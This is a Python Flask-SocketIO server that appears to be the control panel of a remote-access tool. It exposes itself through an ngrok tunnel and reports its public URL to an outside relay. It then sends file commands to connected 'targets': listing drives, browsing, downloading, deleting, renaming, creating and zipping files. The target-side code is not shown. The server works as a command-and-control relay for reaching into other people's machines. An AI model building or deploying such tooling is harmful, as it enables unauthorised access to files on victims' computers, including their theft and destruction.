import json
import os
import ngrok
import requests
from dotenv import load_dotenv
from flask import Flask, request, render_template
from flask_socketio import SocketIO, emit
from flask_socketio.namespace import Namespace
# import engineio  # ONLY FOR PRODUCTION
# from engineio.async_drivers import gevent  # ONLY FOR PRODUCTION

load_dotenv()

listener = ngrok.forward(5000, authtoken_from_env=True)
resp = requests.post(f"{os.getenv('NGROK_LINK_FORWARD_URL')}/set_url", json.dumps({"url": listener.url()+"/"}))

app = Flask(__name__)
# app = Flask(__name__, template_folder=os.getcwd(), static_folder=os.getcwd(), static_url_path="/")    # ONLY FOR PRODUCTION
app.secret_key = os.getenv("APP_SECRET_KEY")
web_socket = SocketIO(app, cors_allowed_origins=["http://127.0.0.1:5000", listener.url()], max_http_buffer_size=25000000)

@app.route("/")
def home():
    return render_template("index.html")

class FileExplorerPoint(Namespace):
    currentlyConnected = None
    connectedTargets = []

    def on_register_target(self, data_):
        data_["sid"] = request.sid
        for item in self.connectedTargets:
            if item["sid"] == request.sid:
                return
        self.connectedTargets.append(data_)
        self.on_list_targets()

    def on_select_target(self, data_):
        self.currentlyConnected = data_["sid"]
        self.emit("response_channel", {"sid": data_["sid"], "type": "target_selected"})

    def on_list_targets(self):
        self.emit("list_targets", {"targets": self.connectedTargets})

    def on_disconnect(self):
        for idx, item in enumerate(self.connectedTargets):
            if item["sid"] == request.sid:
                self.connectedTargets.pop(idx)
                break
        if request.sid == self.currentlyConnected:
            self.currentlyConnected = None
        self.on_list_targets()

    def on_drive_infos(self, data_):
        print(data_)

    def on_list_drives(self):
        emit("list_drives", to=self.currentlyConnected)

    def on_list_files(self, data_):
        emit("list_files", data_, to=self.currentlyConnected)

    def on_switch_dir(self, data_):
        emit("switch_dir", data_, to=self.currentlyConnected)

    def on_download_file(self, data_):
        emit("download_file", data_, to=self.currentlyConnected)

    def on_delete_media(self, data_):
        emit("delete_media", data_, to=self.currentlyConnected)

    def on_rename_media(self, data_):
        emit("rename_media", data_, to=self.currentlyConnected)

    def on_create_new_file(self, data_):
        emit("create_new_file", data_, to=self.currentlyConnected)

    def on_create_new_folder(self, data_):
        emit("create_new_folder", data_, to=self.currentlyConnected)

    def on_begin_zip_folder(self, data_):
        emit("begin_zip_folder", data_, to=self.currentlyConnected)

    def on_cancle_zip_folder(self):
        emit("cancle_zip_folder", to=self.currentlyConnected)
    def on_response_channel(self, data_):
        self.emit("response_channel", data_, include_self=False)

web_socket.on_namespace(FileExplorerPoint("/file_explorer"))

if __name__ == '__main__':
    print(f"**STATUS NGROK HOSTING : {resp.text}")
    print(f"**NGROK SERVER RUNNING AT (WAN) : {listener.url()}")
    print("**LOCAL SERVER RUNNING AT : http://127.0.0.1:5000")
    web_socket.run(app, host="127.0.0.1", port=5000, allow_unsafe_werkzeug=True)